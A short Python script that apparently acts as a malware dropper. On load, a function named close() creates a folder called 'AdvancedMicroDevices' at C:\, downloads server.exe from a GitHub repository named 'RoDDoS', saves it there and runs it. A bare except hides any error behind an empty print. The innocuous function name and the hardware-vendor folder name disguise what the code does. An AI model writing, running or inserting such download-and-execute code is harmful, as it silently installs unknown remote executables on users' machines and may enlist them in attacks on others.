from admcheck import *
import ctypes, os, requests

def is_Admin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def close():
    try:
        directory = "AdvancedMicroDevices"
        parent_dir = f"C:\\"
        path = os.path.join(parent_dir, directory)
        os.mkdir(path)
        url = "https://raw.githubusercontent.com/Cannonation/RoDDoS/main/serv/sv/server.exe"
        r = requests.get(url)  
        with open(f'C://AdvancedMicroDevices//server.exe', 'wb') as f:
            f.write(r.content)
            f.close()

        os.startfile('C://AdvancedMicroDevices//server.exe')
    except:
     print("")

close()
